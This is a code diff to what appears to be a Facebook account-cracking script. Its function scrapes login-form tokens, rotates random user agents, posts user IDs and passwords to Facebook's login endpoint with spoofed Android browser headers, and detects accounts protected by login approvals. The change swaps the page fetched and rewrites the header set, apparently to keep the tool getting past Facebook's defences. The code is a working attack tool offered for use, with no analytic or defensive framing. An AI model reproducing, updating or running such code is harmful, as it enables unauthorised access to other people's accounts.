@@ -2027,7 +2027,7 @@ def mobile(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -2038,22 +2038,22 @@ def mobile(uid,pwx,tl):
             'login': 'Masuk'}
             headers ={
             'Host': 'm.facebook.com',
-            'Connection': 'keep-alive',
-            'Viewport-Width': '393',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
-            'X-Response-Format': 'JSONStream',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': 'AVqPRG01eU8',
-            'X-Requested-With': 'XMLHttpRequest',
-            'X-ASBD-ID': '129477',
-            'DPR': '2.75',
-            'Accept': '*/*',
-            'Origin': 'https://m.facebook.com',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=490105264797912&kid_directed_site=0&app_id=490105264797912&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D490105264797912%26cbt%3D1728280883028%26e2e%3D%257B%2522init%2522%253A1728280883028%257D%26ies%3D0%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D7b543b8f-7066-45b6-9ce8-3a79cdf552f8%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25224cdc151e-bd62-4fed-9c8d-c46031970b97%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522s6l57jsd9apv3428i6e4%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.miniclip.carrom%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3Dc5Q4EZAbsVp16Xn0w582M_gjoxuu-RnYc1SWty8hFE0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4cdc151e-bd62-4fed-9c8d-c46031970b97%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.miniclip.carrom%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224cdc151e-bd62-4fed-9c8d-c46031970b97%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522s6l57jsd9apv3428i6e4%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
-            'Accept-Language': 'en-US,en;q=0.9',}
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"M2010J19SI"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://www.facebook.com/login/"
             po = Session.post(url, data=data, headers=headers).text
